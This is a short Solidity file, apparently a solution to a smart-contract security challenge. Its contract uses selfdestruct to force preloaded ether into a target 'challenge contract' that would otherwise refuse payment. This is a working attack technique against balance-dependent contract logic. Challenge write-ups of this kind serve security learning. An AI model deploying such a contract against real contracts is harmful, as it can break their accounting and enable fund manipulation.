// SPDX-License-Identifier: UNLICENSED

//Contractcreated to self destruct and force eth to the challenge contract
pragma solidity ^0.8.0;

contract TakeMyEth {

  //constructor payable so that it can be preloaded with an eth amount
  constructor () payable {

  }

  function takeMyEth(address payable _address) payable public {
    selfdestruct(_address);
  }
}
